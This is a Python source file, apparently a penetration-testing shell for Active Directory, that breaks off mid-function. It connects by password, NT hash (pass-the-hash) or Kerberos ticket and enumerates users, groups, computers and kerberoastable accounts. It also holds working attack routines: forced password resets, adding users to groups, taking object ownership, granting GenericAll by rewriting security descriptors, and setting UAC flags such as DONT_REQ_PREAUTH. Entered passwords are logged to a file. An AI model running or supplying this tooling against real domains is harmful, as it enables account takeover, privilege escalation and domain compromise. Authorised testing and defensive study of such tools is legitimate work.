import time
import ssl
from ldap3 import Server, ALL, Connection, NTLM, SUBTREE, Tls, MODIFY_ADD, MODIFY_REPLACE, SASL, KERBEROS
from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR, LDAP_SID
from rich import print # for colors
import readline
import rlcompleter
import os
import atexit
import heapq
import shlex

histfile = os.path.expanduser(".ldap_shell_history")

if os.path.exists(histfile):
    readline.read_history_file(histfile)

atexit.register(readline.write_history_file, histfile)
UAC_FLAGS = {
    "SCRIPT": 0x00000001,
    "ACCOUNTDISABLE": 0x00000002,
    "HOMEDIR_REQUIRED": 0x00000008,
    "LOCKOUT": 0x00000010,
    "PASSWD_NOTREQD": 0x00000020,
    "PASSWD_CANT_CHANGE": 0x00000040,
    "ENCRYPTED_TEXT_PWD_ALLOWED": 0x00000080,
    "TEMP_DUPLICATE_ACCOUNT": 0x00000100,
    "NORMAL_ACCOUNT": 0x00000200,
    "INTERDOMAIN_TRUST_ACCOUNT": 0x00000800,
    "WORKSTATION_TRUST_ACCOUNT": 0x00001000,
    "SERVER_TRUST_ACCOUNT": 0x00002000,
    "DONT_EXPIRE_PASSWORD": 0x00010000,
    "MNS_LOGON_ACCOUNT": 0x00020000,
    "SMARTCARD_REQUIRED": 0x00040000,
    "TRUSTED_FOR_DELEGATION": 0x00080000,
    "NOT_DELEGATED": 0x00100000,
    "USE_DES_KEY_ONLY": 0x00200000,
    "DONT_REQ_PREAUTH": 0x00400000,
    "PASSWORD_EXPIRED": 0x00800000,
    "TRUSTED_TO_AUTH_FOR_DELEGATION": 0x01000000,
    "PARTIAL_SECRETS_ACCOUNT": 0x04000000
}

COMMANDS = [
    "connect", "connectssl", "connect_hash", "disconnect", "use",
    "sessions", "status", "query", "history", "batch_lookup",
    "categories", "groups", "users", "computers", "kerberoasting", "checkacl", "addmember",
    "setpass", "help", "exit", "savepassword", "show_all_history", "offline_search", "shares",
    "get_sid", "getgmsa", "setowner", "genericall", "adduac", "rmuac"
]

def shell_completer(text, state):
    options = [cmd for cmd in COMMANDS if cmd.startswith(text)]
    if state < len(options):
        return options[state]
    return None

readline.set_completer(shell_completer)
readline.parse_and_bind("tab: complete")


class Session:
    def __init__(self):
        self.items = []

    def push(self, item):
        self.items.append(item)

    def pop(self):
        """when its empty"""
        if self.is_empty():
            raise IndexError("no history yet :(")
        return self.items.pop()
    def peek(self):
        if self.is_empty():
            raise IndexError("*")
        return self.items[-1]
    def is_empty(self):
        return len(self.items) == 0

    def size(self):
        return len(self.items)

    def show_all(self):
        print("[bold magenta]--- Query History ---[/bold magenta]")
        for i, item in enumerate(self.items, 1):
            print(f"{i}. {item}")

    def __str__(self):
        return f"Session({self.items})"
class Queue:
    def __init__(self):
        self.items = []
    def enqueue(self, item):
        self.items.append(item)
    def dequeue(self):
        if self.is_empty():
            raise IndexError("Queue empty")
        return self.items.pop(0)
    def is_empty(self):
        return len(self.items) == 0
    def size(self):
        return len(self.items)
class DecisionNode:
    def __init__(self, question, left=None, right=None):
        self.question = question
        self.left = left
        self.right = right
class TreeNode:
    def __init__(self, value):
        self.value = value
        self.children = []
class HistoryNode:
    def __init__(self, data):
        self.data = data
        self.next = None
class SinglyLinkedList:
    def __init__(self):
        self.head = None
        self.size = 0
    def is_empty(self):
        return self.head is None
    def get_size(self):
        return self.size

    def add(self, data):
        new_node = HistoryNode(data)
        if not self.head:
            self.head = new_node
            self.tail = new_node
        else:
            self.tail.next = new_node
            self.tail = new_node
        self.size += 1

    def insert_at_beginning(self, data):

        new_node = HistoryNode(data)
        new_node.next = self.head
        self.head = new_node
        self.size += 1

    def insert_at_end(self, data):
        new_node = HistoryNode(data)

        if self.is_empty():
            self.head = new_node
        else:
            current = self.head
            while current.next:
                current = current.next
            current.next = new_node
        self.size += 1

    def insert_at_position(self, data, position):

        if position < 0 or position > self.size:
            raise IndexError("Position out of range")
        if position == 0:
            self.insert_at_beginning(data)
            return
        new_node = HistoryNode(data)
        current = self.head

        for _ in range(position -1):
            current = current.next

        new_node.next = current.next
        current.next = new_node
        self.size += 1

    def delete_all_beginning(self):

        if self.is_empty():
            raise IndexError("List is empty")

        data = self.head.data
        self.head = self.head.next
        self.size -= 1
        return data
    def delete_at_end(self):
        if self.is_empty():
            raise IndexError("List is empty")

        if self.head.next is None:
            data = self.head.data
            self.head = None
            self.size -= 1
            return data
        current = self.head
        while current.next.next:
            current = current.next
        data = current.next.data
        current.next = None
        self.size -= 1
        return data
    def delete_by_value(self, value):
        if self.is_empty():
            raise IndexError("List is empty")

        if self.head.data == value:
            self.delete_all_beginning()
            return True

        current = self.head
        while current.next:
            if current.next.data == value:
                current.next = current.next.next
                self.size -= 1
                return True
            current = current.next
        return False

    def search(self, value):
        current = self.head
        position = 0

        while current:
            if current.data == value:
                return position
            current = current.next
            position += 1
        return -1

    def display(self):
        if self.is_empty():
            return "Empty List"

        current = self.head
        elements = []

        while current:
            elements.append(str(current.data))
            current = current.next

        return " -> ".join(elements) + " -> None"


    def show_all(self):
        print("[bold magenta]--- Query History ---[/bold magenta]")
        current = self.head
        count = 1
        while current:
            print(f"{count}. {current.data}")
            current = current.next
            count += 1

    def __str__(self):
        return self.display()
class SessionManager:
    def __init__(self, max_size=1000):
        self.queue = []
        self.max_size = max_size

    def add_session(self, profile):
        if len(self.queue) >= self.max_size:
            old_session = self.queue.pop(0)
            print(f"[bold red][!] Session limit reached. Disconnecting: {old_session['username']}[/bold red]")

        self.queue.append(profile)
        return len(self.queue) - 1
    def get_session(self, index):
        return self.queue[index]

class BSTNode:
    def __init__(self, username, data=None):
        self.key = username.lower()
        self.data = data
        self.left = None
        self.right = None
class UserCacheBST:
    def __init__(self):
        self.root = None

    def insert(self, username, data):
        if not self.root:
            self.root = BSTNode(username, data)
            return

        curr = self.root
        while True:
            if username.lower() < curr.key:
                if curr.left is None:
                    curr.left = BSTNode(username, data)
                    break
                curr = curr.left
            elif username.lower() > curr.key:
                if curr.right is None:
                    curr.right = BSTNode(username, data)
                    break
                curr = curr.right
            else:
                break

    def search(self, username):
        curr = self.root
        key = username.lower()
        while curr:
            if key == curr.key:
                return curr.data
            elif key < curr.key:
                curr = curr.left
            else:
                curr = curr.right
        return None



def show_menu():
    print("""
    Available Commands :
    connect <username> <password> <domain> <dc_ip> - Connect to AD
    connectssl <username> <password> <domain> <dc_ip> - Connect to AD via SSL
    connect_hash <username> <nthash> <domain> <dc_ip> - Connect using NT Hash
    disconnect   - Disconnect from AD
    use <id>     - Use a specific session
    sessions     - Current sessions
    status       - Show status
    query        - Query for user - query <username>
    history      - Check history pop
    batch_lookup - batch users
    categories   - Show categories
    groups       - List all groups
    users        - List all users
    computers    - List all computers
    kerberoasting- List kerberoastable accounts
    checkacl     - Check ACLs for current session user using aclftw
    addmember    - Add member to group - addmember <group> <user>
    setpass      - Set user password - setpass <user> <newpassword>
    offline_search - Search cached users offline - offline_search <username>
    shares       - Enumerate SMB shares  - shares <target_ip>
                   List files in share   - shares <target_ip> <share>
                   Browse subdirectory   - shares <target_ip> "<share>\\<subdir>"
                   Download from share   - shares <target_ip> <share> get <file>
                   Upload to share       - shares <target_ip> <share> put <file>
                   Tip: use quotes for multi-word shares e.g. "Department Shares"
    get_sid      - Get user's SID       - get_sid <username>
    savepassword - Save a password      - savepassword <password>
    show_all_history - Show all query history
    help         - Menu
    exit         - Exit
    """)
def infer_netbios(domain):
    return domain.split('.')[0].upper()
def domain_to_dn(domain):
    return ','.join(f'DC={x}' for x in domain.split('.'))

def check_connection(tree, connected):
    print(f"Decision: {tree.question}")
    if connected:
        print(f" -> [bold green]Yes[/bold green]: {tree.right.question}")
    else:
        print(f" -> [bold red]No[/bold red]: {tree.left.question}")

def batch_lookup(conn, base_dn):

    priority_map = {"administrator": 1, "krbtgt": 1, "guest": 3}

    users = ["osman", "mark", "Administrator", "guest", "irem", "krbtgt"]
    pq = []

    for u in users:
        priority = priority_map.get(u.lower(), 2)
        heapq.heappush(pq, (priority, u))
    print(f"{len(pq)} users queued with priority logic")

    while pq:
        priority, username = heapq.heappop(pq)
        print(f"[+] [{priority}] Checking {username}...")
        conn.search(base_dn, f"(sAMAccountName={username})", attributes=["cn"])

        if conn.entries:
            print(f"[bold green]Found: {username}[/bold green]")
        else:
            print(f"[bold red]Not Found: {username}[/bold red]")


    # enqueu users
    queue = Queue()
    for u in users:
        queue.enqueue(u)
    print(f"[+] {queue.size()} users queued")

    while not queue.is_empty():
        username = queue.dequeue()
        print(f"[+] Checking {username}")
        conn.search(base_dn, f"(sAMAccountName={username})", attributes=["cn"])

        if conn.entries:
            print(f"[+] {username} exist")
        else:
            print(f"[-] {username} not found")

def build_category_tree(conn, base_dn):
    root = TreeNode("Objects")
    users_node = TreeNode("Users")
    computers_node = TreeNode("Computers")

    root.children.append(users_node)
    root.children.append(computers_node)

    # query users
    conn.search(base_dn, "(objectClass=user)", attributes=['sAMAccountName'], size_limit=1000)

    for entry in conn.entries:
        users_node.children.append(TreeNode(str(entry.sAMAccountName)))
    # query compouters
    conn.search(base_dn, "(objectClass=computer)", attributes=['sAMAccountName'], size_limit=1000)

    for entry in conn.entries:
        computers_node.children.append(TreeNode(str(entry.sAMAccountName)))

    return root

def print_categories(root):

    for category in root.children:
        print(f"\n[bold cyan]{category.value}[/bold cyan]")

        for obj in category.children:
            print(f"- {obj.value}")

WELL_KNOWN_SIDS = {
    "S-1-0-0": "Nobody",
    "S-1-1-0": "Everyone",
    "S-1-2-0": "Local",
    "S-1-3-0": "Creator Owner",
    "S-1-3-1": "Creator Group",
    "S-1-5-1": "Dialup",
    "S-1-5-2": "Network",
    "S-1-5-3": "Batch",
    "S-1-5-4": "Interactive",
    "S-1-5-6": "Service",
    "S-1-5-7": "Anonymous Logon",
    "S-1-5-9": "Enterprise Domain Controllers",
    "S-1-5-10": "Self",
    "S-1-5-11": "Authenticated Users",
    "S-1-5-12": "Restricted Code",
    "S-1-5-13": "Terminal Server Users",
    "S-1-5-14": "Remote Interactive Logon",
    "S-1-5-17": "IIS APPPOOL",
    "S-1-5-18": "Local System",
    "S-1-5-19": "NT Authority\\Local Service",
    "S-1-5-20": "NT Authority\\Network Service",
}

def resolve_sid(conn, base_dn, sid):
    """Resolve a SID string to its friendly name."""
    if sid in WELL_KNOWN_SIDS:
        return WELL_KNOWN_SIDS[sid]
    # try LDAP lookup for domain-specific SIDs
    try:
        conn.search(base_dn, f"(objectSid={sid})", attributes=["cn"])
        if conn.entries:
            return str(conn.entries[0].cn)
    except Exception:
        pass
    return sid

def resolve_member_name(conn, base_dn, member):
    """Resolve a member value to a friendly name. Handles both DN and SID formats."""
    if member.startswith("CN="):
        cn = member.split(",")[0].replace("CN=", "")
        # Foreign Security Principals have SIDs as their CN
        if cn.startswith("S-1-"):
            return resolve_sid(conn, base_dn, cn)
        return cn
    if member.startswith("S-1-"):
        return resolve_sid(conn, base_dn, member)
    return member

def list_groups_bfs(conn, base_dn):
    # fopr find al l groups
    conn.search(base_dn, "(objectClass=group)", attributes=["cn", "member"])

    groups = {}

    for entry in conn.entries:
        name = str(entry.cn)
        members = entry.member.values if "member" in entry else []
        groups[name] = members

    for group in groups:
        print(f"\n[bold cyan]{group}[/bold cyan]")
        queue = Queue()
        # enmque first level members
        for m in groups[group]:
            queue.enqueue(m)

        while not queue.is_empty():

            member = queue.dequeue()

            # resolve to friendly name (handles both DN and SID)
            cn = resolve_member_name(conn, base_dn, member)
            print(f"[bold yellow]|_{cn}[/bold yellow]")

            if cn in groups:
                for submember in groups[cn]:
                    queue.enqueue(submember)

def list_users(conn, base_dn):
    conn.search(base_dn, "(&(objectClass=User)(!(objectClass=computer)))", attributes=["sAMAccountName", "description"]) # we can add more tho

    print("\n[bold cyan]Users[/bold cyan]")

    with open("usernames.txt", "w") as outfile:


        for entry in conn.entries:

            user = str(entry.sAMAccountName)

            user_cache.insert(user, str(entry))

            desc = ""

            if "description" in entry:
                desc = str(entry.description)
            print(f"[bold yellow]{user} - {desc}[/bold yellow]")

            outfile.write(user + "\n")
    print(f"[+] {len(conn.entries)} usernames saved to usernames.txt")
def list_computers(conn, base_dn):
    conn.search(base_dn, "(objectClass=computer)", attributes=["sAMAccountName", "dNSHostname", "operatingSystem", "memberOf", "distinguishedName"]) # we can add more tho

    print("\n[bold cyan]Computers[/bold cyan]")

    for entry in conn.entries:

        comp = str(entry.sAMAccountName)
        dnshostname = str(entry.dNSHostname)
        operatingsystem = str(entry.operatingSystem)
        membersof = str(entry.memberOf)
        distinguishedNamee = str(entry.distinguishedName)
        print(f"[bold yellow]{comp} - {dnshostname} - {operatingsystem} - {distinguishedNamee}[/bold yellow]")
        if "Pre-Windows 2000" in membersof:
            if not "Domain Controllers" in distinguishedNamee:
                print(f"[bold red]{comp} has weakkness try pre2k for this computer[/bold red]")

def add_member(conn, base_dn, group_name, user_name):
    conn.search(base_dn, f"(sAMAccountName={user_name})", attributes=["distinguishedName"])

    if not conn.entries:
        print("User not found")
        return

    user_dn = conn.entries[0].distinguishedName.value
    conn.search(base_dn, f"(sAMAccountName={group_name})", attributes=["distinguishedName"])

    if not conn.entries:
        print("Group not found")
        return
    group_dn = conn.entries[0].distinguishedName.value

    conn.modify(group_dn, {"member": [(MODIFY_ADD, [user_dn])]})

    if conn.result["result"] == 0:
        print(f"[+] {user_name} added to {group_name}")
    else:
        print(f"[-] Failed:", conn.result)

def set_password(conn, user_dn, new_password):
    pwd = f'"{new_password}"'.encode("utf-16-le")

    conn.modify(user_dn, {"unicodePwd": [(MODIFY_REPLACE, [pwd])]})

    if conn.result["result"] == 0:
        print("[+] Password changed")
    else:
        print("[-] Failed:", conn.result)

def modify_uac(conn, base_dn, target_user, flag_name, action="add"):
    if flag_name not in UAC_FLAGS:
        print(f"[bold red][-] Unknown UAC flag:[/bold red] {flag_name}")
        print(f"[bold yellow]Available flags:[/bold yellow] {', '.join(UAC_FLAGS.keys())}")
        return

    flag_val = UAC_FLAGS[flag_name]
    
    conn.search(base_dn, f"(sAMAccountName={target_user})", attributes=['userAccountControl', 'distinguishedName'])
    if not conn.entries:
        print(f"[bold red][-] Could not find target user {target_user}[/bold red]")
        return
        
    entry = conn.entries[0]
    target_dn = entry.distinguishedName.value
    
    if "userAccountControl" not in entry or entry.userAccountControl.value is None:
        print("[bold red][-] Target does not have a userAccountControl attribute.[/bold red]")
        return
        
    current_uac = entry.userAccountControl.value
    
    if action == "add":
        if current_uac & flag_val:
            print(f"[bold yellow][!] User already has {flag_name} flag set.[/bold yellow]")
            return
        new_uac = current_uac | flag_val
    elif action == "remove":
        if not (current_uac & flag_val):
            print(f"[bold yellow][!] User does not have {flag_name} flag set.[/bold yellow]")
            return
        new_uac = current_uac & ~flag_val
        
    changes = {'userAccountControl': [(MODIFY_REPLACE, [new_uac])]}
    conn.modify(target_dn, changes)
    
    if conn.result["result"] == 0:
        print(f"[bold green][+] Successfully {action}ed {flag_name} UAC flag for {target_user}[/bold green]")
    else:
        print(f"[bold red][-] Failed to {action} UAC flag: {conn.result['description']}[/bold red]")

def cmd_setowner(conn, base_dn, target_user, sess_user):
    print(f"[*] Attempting to set owner of '{target_user}' to '{sess_user}'")

    conn.search(base_dn, f"(sAMAccountName={sess_user})", attributes=['objectSid'])
    if not conn.entries:
        print(f"[bold red][-] Could not resolve SID for current user {sess_user}[/bold red]")
        return
    owner_sid_raw = conn.entries[0]['objectSid'].raw_values[0]

    conn.search(base_dn, f"(sAMAccountName={target_user})", attributes=['distinguishedName'])
    if not conn.entries:
        print(f"[bold red][-] Could not resolve target user {target_user}[/bold red]")
        return
    target_dn = conn.entries[0].distinguishedName.value

    from ldap3.protocol.microsoft import security_descriptor_control
    ctrls = security_descriptor_control(sdflags=0x01)

    conn.search(target_dn, '(objectClass=*)', search_scope='BASE', attributes=['nTSecurityDescriptor'], controls=ctrls)

    if not conn.entries or 'nTSecurityDescriptor' not in conn.entries[0]:
        print(f"[bold red][-] Could not read nTSecurityDescriptor of target. You might lack permissions![/bold red]")
        return

    current_sd_raw = conn.entries[0]['nTSecurityDescriptor'].raw_values[0]

    from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR, LDAP_SID
    sd = SR_SECURITY_DESCRIPTOR()
    sd.fromString(current_sd_raw)
    sd['OwnerSid'] = LDAP_SID(owner_sid_raw)
    new_sd_raw = sd.getData()
    
    changes = {'nTSecurityDescriptor': [(MODIFY_REPLACE, [new_sd_raw])]}
    
    conn.modify(target_dn, changes, controls=ctrls)

    if conn.result["result"] == 0:
        print(f"[bold green][+] Successfully took ownership of '{target_user}'[/bold green]")
    else:
        print(f"[bold red][-] Failed to change owner: {conn.result['description']}[/bold red]")
def cmd_genericall(conn, base_dn, target_user, sess_user):
    print(f"[*] Attempting to grant GenericAll on '{target_user}' to '{sess_user}'")

    conn.search(base_dn, f"(sAMAccountName={sess_user})", attributes=['objectSid'])
    if not conn.entries:
        print(f"[bold red][-] Could not resolve SID for current user {sess_user}[/bold red]")
        return
    session_sid_raw = conn.entries[0]['objectSid'].raw_values[0]

    conn.search(base_dn, f"(sAMAccountName={target_user})", attributes=['distinguishedName'])
    if not conn.entries:
        print(f"[bold red][-] Could not resolve target user {target_user}[/bold red]")
        return
    target_dn = conn.entries[0].distinguishedName.value

    from ldap3.protocol.microsoft import security_descriptor_control
    ctrls = security_descriptor_control(sdflags=0x04)

    conn.search(target_dn, '(objectClass=*)', search_scope='BASE', attributes=['nTSecurityDescriptor'], controls=ctrls)

    if not conn.entries or 'nTSecurityDescriptor' not in conn.entries[0]:
        print(f"[bold red][-] Could not read nTSecurityDescriptor of target. You might lack permissions! [/bold red]")
        return

    current_sd_raw = conn.entries[0]['nTSecurityDescriptor'].raw_values[0]

    from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR, LDAP_SID, ACE, ACCESS_ALLOWED_ACE, ACCESS_MASK
    sd = SR_SECURITY_DESCRIPTOR()
    sd.fromString(current_sd_raw)

    nace = ACE()
    nace['AceType'] = 0x00
    nace['AceFlags'] = 0x00

    acedata = ACCESS_ALLOWED_ACE()
    acedata['Mask'] = ACCESS_MASK()
    acedata['Mask']['Mask'] = 983551
    acedata['Sid'] = LDAP_SID(session_sid_raw)

    nace['Ace'] = acedata

    sd['Dacl'].aces.append(nace)
    new_sd_raw = sd.getData()

    changes = {'nTSecurityDescriptor': [(MODIFY_REPLACE, [new_sd_raw])]}

    conn.modify(target_dn, changes, controls=ctrls)

    if conn.result["result"] == 0:
        print(f"[bold green][+] Successfully granted GenericAll on '{target_user}' to '{sess_user}'[/bold green]")

    else:
        print(f"[bold red][-] Failed to grant GenericAll: {conn.result['description']}[/bold red]")

def kerberoastable(conn, base_dn):
    conn.search(base_dn, "(&(objectClass=user)(!(objectClass=computer))(servicePrincipalName=*)(!(sAMAccountName=krbtgt)))", attributes=["sAMAccountName", "servicePrincipalName"])
    print("\n[bold red]Kerberoastable Accounts[/bold red]")

    for entry in conn.entries:
        user = str(entry.sAMAccountName)

        spn = ""

        if "servicePrincipalName" in entry:
            spn = str(entry.servicePrincipalName)
        print(f"[bold red] {user} - {spn}[/bold red]")

def sid_to_string(binary_sid):
    """Convert a binary SID (bytes) to its string representation S-1-5-21-..."""
    if isinstance(binary_sid, str):
        return binary_sid
    revision = binary_sid[0]
    sub_authority_count = binary_sid[1]
    authority = int.from_bytes(binary_sid[2:8], byteorder='big')
    subs = []
    for i in range(sub_authority_count):
        offset = 8 + i * 4
        subs.append(int.from_bytes(binary_sid[offset:offset+4], byteorder='little'))
    return f"S-{revision}-{authority}-" + "-".join(str(s) for s in subs)

def get_sid(conn, base_dn, username):
    """Retrieve and display the SID for a given user."""
    conn.search(base_dn, f"(sAMAccountName={username})", attributes=["objectSid", "sAMAccountName", "distinguishedName"])
    if not conn.entries:
        print(f"[bold red][-] User '{username}' not found[/bold red]")
        return
    entry = conn.entries[0]
    raw_sid = entry["objectSid"].raw_values[0]
    sid_str = sid_to_string(raw_sid)
    print(f"\n[bold cyan]SID for {username}[/bold cyan]")
    print(f"[bold yellow]  User : {entry.sAMAccountName}[/bold yellow]")
    print(f"[bold yellow]  DN   : {entry.distinguishedName}[/bold yellow]")
    print(f"[bold green]  SID  : {sid_str}[/bold green]")

def save_password(password):
    filename = "passwords.txt"

    existing = set()

    if os.path.exists(filename):
        with open(filename, "r") as f:
            existing = {line.strip() for line in f}
    if password in existing:
        print("[bold yellow][!] Password already in list[/bold yellow]")
        return

    with open(filename, "a") as f:
        f.write(password + "\n")

    print(f"[bold green][+] Password saved: {password}[/bold green]")

sessions = Session()
current_session = None
history = Session()
MAX_SESSIONS = 10
decision_tree = DecisionNode("Am I connected?")
decision_tree.left = DecisionNode("Not Connected. Run 'connect'")
decision_tree.right = DecisionNode("Connected. Continue")
user_cache = UserCacheBST()


def connect(connection):
    #session = Session()
    global current_session

    while True:
        if current_session:
            prompt = f"ldap({current_session['username']}@{current_session['ip']})> "
        else:
            prompt = "shell> "

        try:
            command = shlex.split(input(prompt).strip())
        except ValueError:
            command = input(prompt).strip().split()
        if not command:
            continue
        elif command[0] == "help":
            show_menu()
        elif command[0] == "connect":
            if len(command) < 5:
                print("connect <username> <password> <domain> <dc_ip>")
                continue
            username = command[1]
            password = command[2]
            domain = command[3]
            dc_ip = command[4]

            netbios = infer_netbios(domain)
            base_dn = domain_to_dn(domain)
            try:
                server = Server(dc_ip, get_info=ALL)
                conn = Connection(server, user=f"{netbios}\\{username}", password=password, authentication=NTLM, auto_bind=True)
                profile = {"ip": dc_ip, "username": username, "password": password, "conn":conn, "base_dn":base_dn, "connected_at": time.time(), "domain": domain, "ldaps": False}
                if sessions.size() >= MAX_SESSIONS:
                    removed = sessions.items.pop(0)
                    print(f"[bold red][!] Session limit reached. Removing oldest session ({removed['username']}@{removed['ip']})[/bold red]")
                    if current_session == removed:
                        current_session = None
                sessions.push(profile)
                if not current_session:
                    current_session = profile
                print(f"[bold green][+] Connected to {domain}. Session ID: {sessions.size()-1}[/bold green]")
                save_password(password)
            except Exception as e:
                print(f"[-] Connection Failed: {e}")
        elif command[0] == "connectk":
            if len(command) < 5:
                print("connectk <username> <password> <domain> <dc_ip>")
                continue
            username = command[1]
            password = command[2]
            domain = command[3]
            dc_ip = command[4]

            netbios = infer_netbios(domain)
            base_dn = domain_to_dn(domain)

            try:
                from impacket.krb5.kerberosv5 import getKerberosTGT
                from impacket.krb5.types import Principal
                from impacket.krb5 import constants
                from impacket.krb5.ccache import CCache

                realm = domain.upper()
                print(f"[*] Getting TGT for {username}@{realm} via impacket...")

                # Build principal (works with machine accounts like MS01$)
                user_principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
                tgt, cipher, old_session_key, session_key = getKerberosTGT(user_principal, password, realm, None, None, None, dc_ip)

                # Save to ccache file (same as getTGT.py)
                ccache = CCache()
                ccache.fromTGT(tgt, old_session_key, session_key)
                ccache_file = f"{username}.ccache"
                ccache.saveFile(ccache_file)
                os.environ["KRB5CCNAME"] = ccache_file
                print(f"[+] TGT saved to {ccache_file}")

                # Kerberos needs DC hostname, not IP (for SPN matching)
                # First get the DC hostname
                tmp_server = Server(dc_ip, get_info=ALL)
                tmp_conn = Connection(tmp_server, auto_bind=True)
                dc_hostname = tmp_server.info.other.get('dnsHostName', [None])[0]
                tmp_conn.unbind()

                if not dc_hostname:
                    dc_hostname = dc_ip
                    print(f"[!] Could not resolve DC hostname, using IP (may fail)")

                print(f"[*] Connecting to {dc_hostname} via Kerberos...")
                server = Server(dc_hostname, get_info=ALL)
                conn = Connection(server, authentication=SASL, sasl_mechanism=KERBEROS, auto_bind=True)
                profile = {"ip": dc_ip, "username": username, "password": password, "conn":conn, "base_dn":base_dn, "connected_at": time.time(), "domain": domain, "ldaps":False}
                if sessions.size() >= MAX_SESSIONS:
                    removed = sessions.items.pop(0)
                    print(f"[bold red][!] Session limit reached. Removing oldest session ({removed['username']}@{removed['ip']})[/bold red]")
                    if current_session == removed:
                        current_session = None
                sessions.push(profile)
                if not current_session:
                    current_session = profile
                print(f"[bold green][+] Connected to {domain} via Kerberos. Session ID: {sessions.size()-1}[/bold green]")
                save_password(password)
            except Exception as e:
                print(f"[-] Connection Failed: {e}")
        elif command[0] == "connect_hash":
            if len(command) < 5:
                print("connect_hash <username> <nthash> <domain> <dc_ip>")
                continue
            username = command[1]
            nthash = command[2]
            domain = command[3]
            dc_ip = command[4]
            netbios = infer_netbios(domain)
            base_dn = domain_to_dn(domain)

            if ":" not in nthash:
                password = f"aad3b435b51404eeaad3b435b51404ee:{nthash}"
            else:
                password = nthash

            try:
                server = Server(dc_ip, get_info=ALL)
                conn = Connection(server, user=f"{netbios}\\{username}", password=password, authentication=NTLM, auto_bind=True)
                profile = {"ip": dc_ip, "username": username, "password": password, "conn":conn, "base_dn":base_dn, "connected_at": time.time(), "domain": domain, "nthash": nthash, "ldaps": False}
                if sessions.size() >= MAX_SESSIONS:
                    removed = sessions.items.pop(0)
                    print(f"[bold red][!] Session limit reached. Removing oldest session ({removed['username']}@{removed['ip']})[/bold red]")
                    if current_session == removed:
                        current_session = None
                sessions.push(profile)
                if not current_session:
                    current_session = profile
                print(f"[bold green][+] Connected to {domain} using PTH. Session ID: {sessions.size()-1}[/bold green]")
            except Exception as e:
                print(f"[-] Connection Failed: {e}")

        elif command[0] == "connectssl":
            if len(command) < 5:
                print("connectssl <username> <password> <domain> <dc_ip>")
                continue
            username = command[1]
            password = command[2]
            domain = command[3]
            dc_ip = command[4]
            netbios = infer_netbios(domain)
            base_dn = domain_to_dn(domain)
            try:
                tls = Tls(validate=ssl.CERT_NONE)
                server = Server(dc_ip, port=636, use_ssl=True, get_info=ALL, tls=tls)
                conn = Connection(server, user=f"{netbios}\\{username}", password=password, authentication=NTLM, auto_bind=True)
                profile = {"ip": dc_ip, "username": username, "password": password, "conn":conn, "base_dn":base_dn, "connected_at": time.time(), "domain": domain, "ldaps": True}
                if sessions.size() >= MAX_SESSIONS:
                    removed = sessions.items.pop(0)
                    print(f"[bold red][!] Session limit reached. Removing oldest session ({removed['username']}@{removed['ip']})[/bold red]")
                    if current_session == removed:
                        current_session = None
                sessions.push(profile)
                if not current_session:
                    current_session = profile
                print(f"[bold green][+] Connected to {domain}. Session ID: {sessions.size()-1}[/bold green]")
                save_password(password)
            except Exception as e:
                print(f"[-] Connection Failed: {e}")

        elif command[0] == "disconnect":
            try:
                dropped = sessions.pop()
                if current_session == dropped:
                    current_session = None
                print(f"Dropped: {dropped.get('username')}@{dropped.get('ip')}")
            except IndexError as e:
                print(e)
        elif command[0] == "status":
            print(sessions)
        elif command[0] == "query":
            check_connection(decision_tree, current_session is not None)

            if current_session is None:
                print("No active session! Please 'use' a session or 'connect' first.")
                continue

            if len(command) < 2:
                print("query <username>")
                continue

            username = command[1]
            try:
                conn = current_session["conn"]
                base_dn = current_session["base_dn"]
                conn.search(base_dn, f"(sAMAccountName={username})", attributes=["cn", "memberOf", "userAccountControl", "userPrincipalName", "objectSid"])
                if conn.entries:
                    entry = conn.entries[0]
                    print(entry)
                    if "userAccountControl" in entry and entry.userAccountControl.value is not None:
                        uac_val = entry.userAccountControl.value
                        flags = [name for name, val in UAC_FLAGS.items() if uac_val & val]
                        print(f"\n[bold cyan]UserAccountControl Flags:[/bold cyan] {', '.join(flags)} ({uac_val})")
                    history.push(username)
                else:
                    print("User not found...")
            except Exception as e:
                print(f"Ldap error: {e}")
        elif command[0] == "history":
            try:
                last = history.pop()
                print(f"Last queried user: {last}")
            except IndexError as e:
                print(e)
        elif command[0] == "show_all_history":
            history.show_all()

        elif command[0] == "batch_lookup":
            if not current_session:
                print("No active session! Please 'use' a session or 'connect' first.")
                continue
            batch_lookup(current_session["conn"], current_session["base_dn"])
        elif command[0] == "use":
            if len(command) < 2:
                print("use <session_id>")
                continue
            try:
                sessionid = int(command[1])
                current_session = sessions.items[sessionid]
                print(f"Using session {sessionid} ({current_session['username']} @ {current_session['ip']})")
            except:
                print("Invalid ID")
        elif command[0] == "sessions":
            if sessions.is_empty():
                print("No active sessions :(")
                continue
            for i, s in enumerate(sessions.items):
                elapsed = int(time.time() - s['connected_at'])
                print(f"[{i}] {s['username']} @ {s['ip']} ({elapsed}s)")
        elif command[0] == "categories":
            if not current_session:
                print("No active session!")
                continue
            root = build_category_tree(current_session["conn"], current_session["base_dn"])
            print_categories(root)
        elif command[0] == "groups":
            if not current_session:
                print("No Active Session!")
                continue
            list_groups_bfs(current_session["conn"], current_session["base_dn"])
        elif command[0] == "users":
            if not current_session:
                print("No Active Session!")
                continue
            list_users(current_session["conn"], current_session["base_dn"])
        elif command[0] == "offline_search":
            if len(command) < 2:
                print("offline_search  <username>")
                continue
            target = command[1]
            result = user_cache.search(target)
            if result:
                print(f"[bold green][+] Cache Hit ![/bold green]\n{result}")
            else:
                print(f"[bold red][!] User not found in offline cache. Run 'users' first to populate it.[/bold red]")
        elif command[0] == "kerberoasting":
            if not current_session:
                print("No Active Session!")
                continue
            kerberoastable(current_session["conn"], current_session["base_dn"])
        elif command[0] == "computers":
            if not current_session:
                print("No Active Session!")
                continue
            list_computers(current_session["conn"], current_session["base_dn"])
            #else:
                #print("\nActive Sessions\n")

                #for i, s in enumerate(sessions.items):
                    #elapsed = int(time.time() - s['connected_at'])
                    #print(f"[{i}] User: {s['username']}, Domain: {s['ip']}")
                    #print(f"[{i}] {s['username']} @ {s['ip']} ({elapsed}s)")
        elif command[0] == "checkacl":
            if not current_session:
                print("No active session! Please 'use' a session or 'connect' first.")
                continue

            target_username = current_session.get("username")
            import argparse
            args = argparse.Namespace()
            args.username = target_username
            args.password = current_session.get("password")
            args.domain = current_session.get("domain")
            args.dc_ip = current_session.get("ip")
            args.dc_fqdn = None
            args.hash = current_session.get("nthash")
